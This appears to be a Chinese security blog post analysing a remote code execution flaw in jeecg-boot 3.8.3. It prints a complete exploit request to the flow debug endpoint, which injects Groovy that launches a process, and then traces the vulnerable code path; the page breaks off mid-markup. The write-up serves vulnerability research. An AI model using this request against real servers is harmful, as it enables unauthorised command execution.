@@ -1,0 +1,944 @@
+
+<!DOCTYPE html><html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="hexo-theme" content="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.33.1" theme-name="Stellar" theme-version="1.33.1">
+  
+  
+  <meta name="generator" content="Hexo 6.3.0">
+  <meta http-equiv='x-dns-prefetch-control' content='on' />
+  
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#000">
+  <meta name="theme-color" content="#f9fafb">
+  <title>jeecg-boot 3.8.3 rce漏洞复现分析 - Sherlock</title>
+
+  
+    <meta name="description" content="前言本文参考：jeecg-boot 3.8.3 debug远程命令执行漏洞分析 漏洞描述及详情见： https:&#x2F;&#x2F;github.com&#x2F;jeecgboot&#x2F;JeecgBoot&#x2F;issues&#x2F;9144 需任意用户权限 本文主要是静态分析，动态调试可见参考文章 漏洞分析下面是漏洞利用请求包，也是接下来进行分析的前提 12345678910111213141516171819202122232425P">
+<meta property="og:type" content="article">
+<meta property="og:title" content="jeecg-boot 3.8.3 rce漏洞复现分析">
+<meta property="og:url" content="http://example.com/2026/03/15/jeecg-boot-3-8-3-rce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/">
+<meta property="og:site_name" content="Sherlock">
+<meta property="og:description" content="前言本文参考：jeecg-boot 3.8.3 debug远程命令执行漏洞分析 漏洞描述及详情见： https:&#x2F;&#x2F;github.com&#x2F;jeecgboot&#x2F;JeecgBoot&#x2F;issues&#x2F;9144 需任意用户权限 本文主要是静态分析，动态调试可见参考文章 漏洞分析下面是漏洞利用请求包，也是接下来进行分析的前提 12345678910111213141516171819202122232425P">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/themes/hexo-theme-stellar/1.jpg">
+<meta property="article:published_time" content="2026-03-15T12:07:54.000Z">
+<meta property="article:modified_time" content="2026-03-16T09:24:42.737Z">
+<meta property="article:author" content="Sherlock">
+<meta property="article:tag" content="智商不够,勤勉来凑;眼神不太好">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/themes/hexo-theme-stellar/1.jpg">
+  
+  
+  
+  <meta name="keywords" content="智商不够,勤勉来凑;眼神不太好">
+
+  <!-- feed -->
+  
+
+  <link rel="stylesheet" href="/css/main.css?v=1.33.1">
+
+
+  
+
+  
+
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Sherlock","sameAs":[],"image":"/themes/hexo-theme-stellar/1.jpg"},"dateCreated":"2026-03-15T20:07:54+08:00","dateModified":"2026-03-16T17:24:42+08:00","datePublished":"2026-03-15T20:07:54+08:00","description":"","headline":"jeecg-boot 3.8.3 rce漏洞复现分析","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2026/03/15/jeecg-boot-3-8-3-rce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/"},"publisher":{"@type":"Organization","name":"Sherlock","sameAs":[],"image":"/themes/hexo-theme-stellar/1.jpg","logo":{"@type":"ImageObject","url":"/themes/hexo-theme-stellar/1.jpg"}},"url":"http://example.com/2026/03/15/jeecg-boot-3-8-3-rce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/","image":[]}</script>
+  
+</head>
+<body>
+
+<div class="l_body content" id="start" layout="post" type="tech" ><aside class="l_left"><div class="sidebg"></div><div class="leftbar-container">
+
+
+<header class="header"><div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="/themes/hexo-theme-stellar/1.jpg" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></a><a class="title" href="/"><div class="main">Sherlock</div><div class="sub cap">言念君子，温其如玉</div></a></div></header>
+
+<div class="nav-area">
+
+<nav class="menu dis-select"><a class="nav-item active" title="博客" href="/" style="color:#1BCDFC"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M5.879 2.879C5 3.757 5 5.172 5 8v8c0 2.828 0 4.243.879 5.121C6.757 22 8.172 22 11 22h2c2.828 0 4.243 0 5.121-.879C19 20.243 19 18.828 19 16V8c0-2.828 0-4.243-.879-5.121C17.243 2 15.828 2 13 2h-2c-2.828 0-4.243 0-5.121.879M8.25 17a.75.75 0 0 1 .75-.75h3a.75.75 0 0 1 0 1.5H9a.75.75 0 0 1-.75-.75M9 12.25a.75.75 0 0 0 0 1.5h6a.75.75 0 0 0 0-1.5zM8.25 9A.75.75 0 0 1 9 8.25h6a.75.75 0 0 1 0 1.5H9A.75.75 0 0 1 8.25 9" clip-rule="evenodd"/><path fill="currentColor" d="M5.235 4.058C5 4.941 5 6.177 5 8v8c0 1.823 0 3.058.235 3.942L5 19.924c-.975-.096-1.631-.313-2.121-.803C2 18.243 2 16.828 2 14v-4c0-2.829 0-4.243.879-5.121c.49-.49 1.146-.707 2.121-.803zm13.53 15.884C19 19.058 19 17.822 19 16V8c0-1.823 0-3.059-.235-3.942l.235.018c.975.096 1.631.313 2.121.803C22 5.757 22 7.17 22 9.999v4c0 2.83 0 4.243-.879 5.122c-.49.49-1.146.707-2.121.803z" opacity=".5"/></svg></a><a class="nav-item" title="社交" href="/friends/" style="color:#F44336"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="m13.629 20.472l-.542.916c-.483.816-1.69.816-2.174 0l-.542-.916c-.42-.71-.63-1.066-.968-1.262c-.338-.197-.763-.204-1.613-.219c-1.256-.021-2.043-.098-2.703-.372a5 5 0 0 1-2.706-2.706C2 14.995 2 13.83 2 11.5v-1c0-3.273 0-4.91.737-6.112a5 5 0 0 1 1.65-1.651C5.59 2 7.228 2 10.5 2h3c3.273 0 4.91 0 6.113.737a5 5 0 0 1 1.65 1.65C22 5.59 22 7.228 22 10.5v1c0 2.33 0 3.495-.38 4.413a5 5 0 0 1-2.707 2.706c-.66.274-1.447.35-2.703.372c-.85.015-1.275.022-1.613.219c-.338.196-.548.551-.968 1.262" opacity=".5"/><path fill="currentColor" d="M10.99 14.308c-1.327-.978-3.49-2.84-3.49-4.593c0-2.677 2.475-3.677 4.5-1.609c2.025-2.068 4.5-1.068 4.5 1.609c0 1.752-2.163 3.615-3.49 4.593c-.454.335-.681.502-1.01.502c-.329 0-.556-.167-1.01-.502"/></svg></a></nav>
+</div>
+<div class="widgets">
+<div class="search-wrapper" id="search-wrapper"><form class="search-form"><a class="search-button" onclick="document.getElementById(&quot;search-input&quot;).focus();"><svg t="1705074644177" viewBox="0 0 1025 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1560" width="200" height="200"><path d="M1008.839137 935.96571L792.364903 719.491476a56.783488 56.783488 0 0 0-80.152866 0 358.53545 358.53545 0 1 1 100.857314-335.166073 362.840335 362.840335 0 0 1-3.689902 170.145468 51.248635 51.248635 0 1 0 99.217358 26.444296 462.057693 462.057693 0 1 0-158.255785 242.303546l185.930047 185.725053a51.248635 51.248635 0 0 0 72.568068 0 51.248635 51.248635 0 0 0 0-72.978056z" p-id="1561"></path><path d="M616.479587 615.969233a50.428657 50.428657 0 0 0-61.498362-5.534852 174.655348 174.655348 0 0 1-177.525271 3.484907 49.403684 49.403684 0 0 0-58.833433 6.76482l-3.074918 2.869923a49.403684 49.403684 0 0 0 8.609771 78.10292 277.767601 277.767601 0 0 0 286.992355-5.739847 49.403684 49.403684 0 0 0 8.404776-76.667958z" p-id="1562"></path></svg></a><input type="text" class="search-input" id="search-input" placeholder="Search"></form><div id="search-result"></div><div class="search-no-result">No Results!</div></div>
+
+
+
+<widget class="widget-wrapper recent post-list"><div class="widget-header dis-select"><span class="name">Recent Update</span></div><div class="widget-body fs14"><a class="item title" href="/2026/03/15/jeecg-boot-3-8-3-rce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/"><span class="title">jeecg-boot 3.8.3 rce漏洞复现分析</span></a><a class="item title" href="/2026/03/09/jeecg-boot-3-7-0-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"><span class="title">jeecg-boot 3.7.0 漏洞分析</span></a><a class="item title" href="/2026/01/12/java%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/"><span class="title">java模板注入漏洞审计学习</span></a><a class="item title" href="/2025/06/30/xss%E5%9C%A8%E4%BC%81%E4%B8%9Asrc%E4%B8%AD%E7%9A%84%E6%8C%96%E6%8E%98%E5%A7%BF%E5%8A%BF/"><span class="title">xss在企业src中的挖掘姿势</span></a><a class="item title" href="/2025/12/03/shiro%E5%AE%89%E5%85%A8%E6%A0%A1%E9%AA%8C%E6%B5%81%E7%A8%8B%E9%9B%B6%E5%9F%BA%E7%A1%80%E6%95%99%E5%AD%A6/"><span class="title">shiro安全校验流程零基础教学</span></a><a class="item title" href="/2025/10/30/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%8A%80%E5%B7%A7/"><span class="title">java代码审计的一些小技巧</span></a><a class="item title" href="/2025/10/12/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/"><span class="title">Vulnstack红日靶场(1)</span></a><a class="item title" href="/2025/05/21/java%E5%86%85%E5%AD%98%E9%A9%AC%E4%B9%8Bjava-agent/"><span class="title">java内存马之java-agent</span></a><a class="item title" href="/2025/10/22/%E9%9D%A2%E8%AF%95%E5%B0%8F%E7%BB%93/"><span class="title">面试小结</span></a><a class="item title" href="/2025/02/13/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bfastjson/"><span class="title">java反序列化之fastjson</span></a></div></widget>
+</div>
+
+</div></aside><div class="l_main" id="main">
+
+
+
+
+
+<div class="article banner top">
+  <div class="content">
+    <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">Home</a>
+<span class="sep"></span><a class="cap breadcrumb" href="/">Blog</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a></div>
+<div class="flex-row" id="post-meta"><span class="text created">Posted on: <time datetime="2026-03-15T12:07:54.000Z">2026-03-15</time></span><span class="sep updated"></span><span class="text updated">Updated on: <time datetime="2026-03-16T09:24:42.737Z">2026-03-16</time></span></div></div></div>
+    
+    <div class="bottom only-title">
+      
+      <div class="text-area">
+        <h1 class="text title"><span>jeecg-boot 3.8.3 rce漏洞复现分析</span></h1>
+        
+      </div>
+    </div>
+    
+  </div>
+  </div><article class="md-text content"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本文参考：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/91644">jeecg-boot 3.8.3 debug远程命令执行漏洞分析</a></p>
+<p>漏洞描述及详情见： <a target="_blank" rel="noopener" href="https://github.com/jeecgboot/JeecgBoot/issues/9144">https://github.com/jeecgboot/JeecgBoot/issues/9144</a></p>
+<p>需任意用户权限</p>
+<p>本文主要是静态分析，动态调试可见参考文章</p>
+<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>下面是漏洞利用请求包，也是接下来进行分析的前提</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">POST /jeecgboot/airag/flow/debug HTTP/1.1</span><br><span class="line">Host: 192.168.129.222:3100</span><br><span class="line">Content-Type: application/json;charset=UTF-8</span><br><span class="line">X-Access-Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzYzNTEyMjM4fQ.fpnLtU5xXXZc4_u3R9_LVrOoKrvcbTtVAPl1o8IjyPA</span><br><span class="line">Accept: application/json, text/plain, /</span><br><span class="line">Cookie: Hm_lvt_0febd9e3cacb3f627ddac64d52caac39=1763209826; HMACCOUNT=17D05CDAEDDE7AD4; Hm_lpvt_0febd9e3cacb3f627ddac64d52caac39=1763209838</span><br><span class="line">X-Version: v3</span><br><span class="line">Referer: http://192.168.129.222:3100/system/user</span><br><span class="line">X-TIMESTAMP: 1763209937511</span><br><span class="line">X-Tenant-Id: 1000</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: en-GB,en-US;q=0.9,en;q=0.8</span><br><span class="line">X-Sign: F4D2602369D6FCB61D92E60217E293E7</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36</span><br><span class="line">Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzYzNTEyMjM4fQ.fpnLtU5xXXZc4_u3R9_LVrOoKrvcbTtVAPl1o8IjyPA</span><br><span class="line">Content-Length: 2266</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">&quot;flow&quot;: &#123;</span><br><span class="line">&quot;design&quot;: &quot;&#123;&quot;nodes&quot;:[&#123;&quot;id&quot;:&quot;start-node&quot;,&quot;type&quot;:&quot;start&quot;,&quot;x&quot;:301,&quot;y&quot;:640,&quot;properties&quot;:&#123;&quot;text&quot;:&quot;开始&quot;,&quot;remarks&quot;:&quot;&quot;,&quot;options&quot;:&#123;&#125;,&quot;inputParams&quot;:[&#123;&quot;field&quot;:&quot;content&quot;,&quot;name&quot;:&quot;用户问题&quot;,&quot;type&quot;:&quot;string&quot;,&quot;required&quot;:false&#125;,&#123;&quot;field&quot;:&quot;history&quot;,&quot;name&quot;:&quot;历史记录&quot;,&quot;type&quot;:&quot;string[]&quot;,&quot;required&quot;:false&#125;],&quot;outputParams&quot;:[],&quot;height&quot;:92,&quot;width&quot;:332&#125;&#125;,&#123;&quot;id&quot;:&quot;code_252727837582266368&quot;,&quot;type&quot;:&quot;code&quot;,&quot;x&quot;:787,&quot;y&quot;:673,&quot;properties&quot;:&#123;&quot;text&quot;:&quot;脚本执行&quot;,&quot;options&quot;:&#123;&quot;codeType&quot;:&quot;groovy&quot;,&quot;code&quot;:&quot;def main(params) &#123;\n new ProcessBuilder(\&quot;calc\&quot;).start()\n return [\n result: \&quot;$&#123;params.arg1&#125;拼接$&#123;params.arg2&#125;\&quot;\n ]\n&#125;&quot;&#125;,&quot;inputParams&quot;:[&#123;&quot;field&quot;:&quot;content&quot;,&quot;name&quot;:&quot;arg1&quot;,&quot;nodeId&quot;:&quot;start-node&quot;&#125;,&#123;&quot;field&quot;:&quot;content&quot;,&quot;name&quot;:&quot;arg2&quot;,&quot;nodeId&quot;:&quot;start-node&quot;&#125;],&quot;outputParams&quot;:[&#123;&quot;field&quot;:&quot;result&quot;,&quot;name&quot;:&quot;返回结果&quot;,&quot;type&quot;:&quot;string&quot;&#125;],&quot;height&quot;:158,&quot;width&quot;:332&#125;&#125;,&#123;&quot;id&quot;:&quot;252727854036520960&quot;,&quot;type&quot;:&quot;end&quot;,&quot;x&quot;:1273,&quot;y&quot;:651,&quot;properties&quot;:&#123;&quot;text&quot;:&quot;结束&quot;,&quot;options&quot;:&#123;&quot;outputText&quot;:false,&quot;outputContent&quot;:&quot;&quot;&#125;,&quot;inputParams&quot;:[],&quot;outputParams&quot;:[&#123;&quot;field&quot;:&quot;result&quot;,&quot;name&quot;:&quot;a&quot;,&quot;nodeId&quot;:&quot;code_252727837582266368&quot;&#125;],&quot;height&quot;:114,&quot;width&quot;:332&#125;&#125;],&quot;edges&quot;:[&#123;&quot;id&quot;:&quot;252727837586460672&quot;,&quot;type&quot;:&quot;base-edge&quot;,&quot;sourceNodeId&quot;:&quot;start-node&quot;,&quot;targetNodeId&quot;:&quot;code_252727837582266368&quot;,&quot;sourceAnchorId&quot;:&quot;start-node_output&quot;,&quot;targetAnchorId&quot;:&quot;code_252727837582266368_input&quot;,&quot;pointsList&quot;:[&#123;&quot;x&quot;:467,&quot;y&quot;:625&#125;,&#123;&quot;x&quot;:567,&quot;y&quot;:625&#125;,&#123;&quot;x&quot;:521,&quot;y&quot;:625&#125;,&#123;&quot;x&quot;:621,&quot;y&quot;:625&#125;]&#125;,&#123;&quot;id&quot;:&quot;252727854040715264&quot;,&quot;type&quot;:&quot;base-edge&quot;,&quot;sourceNodeId&quot;:&quot;code_252727837582266368&quot;,&quot;targetNodeId&quot;:&quot;252727854036520960&quot;,&quot;sourceAnchorId&quot;:&quot;code_252727837582266368_output&quot;,&quot;targetAnchorId&quot;:&quot;252727854036520960_input&quot;,&quot;pointsList&quot;:[&#123;&quot;x&quot;:953,&quot;y&quot;:625&#125;,&#123;&quot;x&quot;:1053,&quot;y&quot;:625&#125;,&#123;&quot;x&quot;:1007,&quot;y&quot;:625&#125;,&#123;&quot;x&quot;:1107,&quot;y&quot;:625&#125;]&#125;]&#125;&quot;,</span><br><span class="line">&quot;chain&quot;: &quot;THEN(\n start.tag(&#x27;start-node&#x27;),\n code_252727837582266368.tag(&#x27;code_252727837582266368&#x27;),\n end.tag(&#x27;252727854036520960&#x27;)\n).tag(&quot;start-node&quot;)&quot;</span><br><span class="line">&#125;,</span><br><span class="line">&quot;inputParams&quot;: &#123; &quot;content&quot;: &quot;1231&quot; &#125;,</span><br><span class="line">&quot;responseMode&quot;: &quot;streaming&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>漏洞路由地址&#x2F;jeecgboot&#x2F;airag&#x2F;flow&#x2F;debug</p>
+<img src="../source/imgs/${fiilname}/image-20260315202343817.png" alt="image-20260315202343817" style="zoom:50%;" />
+
+<p>看到调用了debugFlow方法，我们跟进去</p>
+<p><img src="/../source/imgs/$%7Bfiilname%7D/image-20260315203545214.png" alt="image-20260315203545214"></p>
+<p>前面的代码片段都是在进行赋值等操作，重点关注最后两行调用的a方法，我们先跟进第一个a方法，看看它的作用是什么</p>
+<p>该方法的主要作用是解析 design JSON、注册脚本节点、注册 Chain、构建 JeecgFlowContext</p>
+<p>对于我们来说，重点关注解析design JSON部分和注册Chain部分</p>
+<p>首先是第一部分</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">design</span> <span class="operator">=</span> flow.getDesign();  <span class="comment">//用户可控的 JSON 字符串</span></span><br><span class="line"><span class="type">JSONObject</span> <span class="variable">designJson</span> <span class="operator">=</span> JSONObject.parseObject(design);</span><br><span class="line"><span class="type">JSONArray</span> <span class="variable">nodes</span> <span class="operator">=</span> designJson.getJSONArray(<span class="string">&quot;nodes&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">HashMap</span> <span class="variable">flowNode</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">nodes.forEach((node) -&gt; &#123;</span><br><span class="line">    <span class="type">FlowNode</span> <span class="variable">flowNodeObj</span> <span class="operator">=</span> ((JSONObject)node).toJavaObject(FlowNode.class);</span><br><span class="line">    <span class="keyword">if</span> (!oConvertUtils.isEmpty(flowNodeObj)) &#123;</span><br><span class="line">        CodeNode.a(flowNodeObj);     <span class="comment">//处理 code 类型节点 → 编译 Groovy → 注册脚本</span></span><br><span class="line">        flowNode.put(flowNodeObj.getId(), flowNodeObj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<p><code>CodeNode.a(flowNodeObj)</code> 是对每个流程节点的<strong>类型检查与脚本注册</strong>方法。它只对 <code>type=&quot;code&quot;</code> 的节点生效，其他类型（start、end、llm 等）直接跳过。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">a</span><span class="params">(FlowNode flowNodeObj)</span> &#123;</span><br><span class="line">    <span class="comment">// ① 只处理 type=&quot;code&quot; 的节点，其他类型直接 return</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&quot;code&quot;</span>.equals(flowNodeObj.getType())) &#123;</span><br><span class="line">        <span class="type">Map</span> <span class="variable">options</span> <span class="operator">=</span> flowNodeConfig.getOptions();</span><br><span class="line">        <span class="comment">//读取用户传入的脚本类型</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">codeType</span> <span class="operator">=</span> (String) options.get(<span class="string">&quot;codeType&quot;</span>);</span><br><span class="line">        <span class="comment">//Python 被禁用</span></span><br><span class="line">        <span class="keyword">if</span> (codeTypeEnum == CodeNodeTypeEnum.PYTHON) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">a</span>(<span class="string">&quot;暂不支持python脚本&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//读取用户传入的恶意代码</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">script</span> <span class="operator">=</span> (String) options.get(<span class="string">&quot;code&quot;</span>);</span><br><span class="line">        <span class="comment">//模板包装（将用户代码嵌入模板）</span></span><br><span class="line">        script = a.a(codeTypeEnum.getTplPath(), templateData);</span><br><span class="line">        <span class="comment">//语法校验（仅检查能否编译，不做安全检查）</span></span><br><span class="line">        ScriptValidator.validate(script, ...);</span><br><span class="line">        /注册为 LiteFlow 脚本节点 → 编译 Groovy → 存入 compiledScriptMap</span><br><span class="line">        LiteFlowNodeBuilder.createScriptNode() <span class="comment">// new Node(type=SCRIPT)</span></span><br><span class="line">            .setId(nodeId)              <span class="comment">// 设置节点id：&quot;code_252727837582266368&quot;</span></span><br><span class="line">            .setScript(script)          <span class="comment">// 存入恶意脚本内容</span></span><br><span class="line">            .setLanguage(<span class="string">&quot;groovy&quot;</span>)</span><br><span class="line">            .build();					<span class="comment">// 编译和注册</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>其中的build()方法主要做了如下的操作，在这里面重点除了编译了恶意脚本外就是绑定了ScriptCommonComponent组件（后续分析中会用到）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">.build()</span><br><span class="line">  │</span><br><span class="line">  └─ FlowBus.addScriptNode()</span><br><span class="line">      └─ addScriptNodeAndCompile()</span><br><span class="line">          └─ addNode(cmpClazz = ScriptCommonComponent.class)</span><br><span class="line">              ├─ new ScriptCommonComponent()                 ← 创建组件实例</span><br><span class="line">              └─ addCompiledNode2Map()</span><br><span class="line">                  ├─ cmpInstance.loadScript(script, &quot;groovy&quot;) ← 编译恶意脚本</span><br><span class="line">                  │    └─ JSR223ScriptExecutor.load()</span><br><span class="line">                  │        └─ compile(script)</span><br><span class="line">                  │            └─ GroovyScriptEngineImpl.compile()</span><br><span class="line">                  │                └─ GroovyClassLoader.parseClass()</span><br><span class="line">                  │                └─ compiledScriptMap.put(&quot;code_xxx&quot;, CompiledScript)</span><br><span class="line">                  ├─ node.setInstance(ScriptCommonComponent)  ← 绑定组件</span><br><span class="line">                  └─ nodeMap.put(&quot;code_xxx&quot;, node)            ← 全局注册</span><br></pre></td></tr></table></figure>
+
+<p>编译过程中将编译好的 Groovy 脚本存进了compiledScriptMap，而compiledScriptMap是一个Map&lt;String, CompiledScript&gt;，比如如下所示</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">compiledScriptMap = &#123;</span><br><span class="line">    &quot;code_252727837582266368&quot; → GroovyCompiledScript(已编译的恶意脚本)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>接下来关注注册Chain部分的代码</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//将编排规则注册到 FlowBus</span></span><br><span class="line"><span class="keyword">if</span> (!FlowBus.containChain(flow.getId())) &#123;</span><br><span class="line">    FlowBus.reloadChain(flow.getId(), flow.getChain());</span><br><span class="line">    <span class="comment">// flow.getChain() = &quot;THEN(start, code_252727837582266368, end)&quot;</span></span><br><span class="line">    <span class="comment">// flow.getId() = 临时 UUID</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>FlowBus.reloadChain()</code> 将用户传入的 <code>chain</code> EL 表达式编译为 <code>ThenCondition</code> 并注册。后续 <code>FlowExecutor.doExecute()</code> 通过 <code>FlowBus.getChain(chainId)</code> 取出这个编排规则来执行。</p>
+<p>至此第一个a方法便结束了，往下走到第二个a方法</p>
+<p><img src="/../source/imgs/$%7Bfiilname%7D/image-20260315221646678.png" alt="image-20260315221646678"></p>
+<p>开头是执行一个a()方法</p>
+<img src="../source/imgs/${fiilname}/image-20260315203112447.png" alt="image-20260315203112447" style="zoom:50%;" />
+
+<p>该方法的目的是为了确保内置节点已注册到 FlowBus，在后面的代码中会用到</p>
+<p>然后根据 <code>responseMode</code> 选择同步或异步方式执行 LiteFlow 链路</p>
+<p>从请求包中的<code>&quot;responseMode&quot;: &quot;streaming&quot;</code>可以知道是走进else从句中</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    SseEmitter emitter;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//获取或创建 SSE 连接</span></span><br><span class="line">    <span class="keyword">if</span> (oConvertUtils.isNotEmpty(flowRunParams.getRequestId())) &#123;</span><br><span class="line">        <span class="comment">// 如果有 requestId，从缓存中获取已有的 SSE 连接</span></span><br><span class="line">        emitter = (SseEmitter) AiragLocalCache.get(<span class="string">&quot;CHAT:TYPE:SSE&quot;</span>, flowRunParams.getRequestId());</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// PoC 走这里：创建新的 SseEmitter（超时 = 0 表示永不超时）</span></span><br><span class="line">        emitter = <span class="keyword">new</span> <span class="title class_">SseEmitter</span>(<span class="number">0L</span>);</span><br><span class="line">        emitter.onError((throwable) -&gt; &#123;</span><br><span class="line">            a.warn(<span class="string">&quot;SEE向客户端发送消息失败: &#123;&#125;&quot;</span>, throwable.getMessage());</span><br><span class="line">            <span class="keyword">try</span> &#123; emitter.complete(); &#125; <span class="keyword">catch</span> (Exception var3) &#123;&#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 将 SSE 连接注入到上下文中（流程节点可通过 context.getEmitter() 推送消息）</span></span><br><span class="line">    context.setEmitter(emitter);</span><br><span 